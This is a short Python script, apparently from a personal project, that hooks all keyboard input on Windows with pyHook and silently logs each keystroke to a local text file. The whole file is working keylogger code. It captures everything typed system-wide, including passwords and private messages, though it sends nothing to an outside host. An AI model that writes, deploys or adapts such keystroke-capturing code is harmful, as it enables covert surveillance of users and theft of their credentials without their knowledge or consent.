
import pythoncom, pyHook, sys, logging


class recordKeys():

    def __init__(self, file_log):
        self.file_log = file_log

    def OnKeyboardEvent(self,event):
        logging.basicConfig(filename=self.file_log, level=logging.DEBUG, format='%(message)s')
        chr(event.Ascii)
        logging.log(10,chr(event.Ascii))
        return True




if __name__ == '__main__':
    r = recordKeys('C:\\Users\\jonmu\\Documents\\GitHub\\ai1\log.txt')
    hm = pyHook.HookManager()
    hm.KeyDown = r.OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()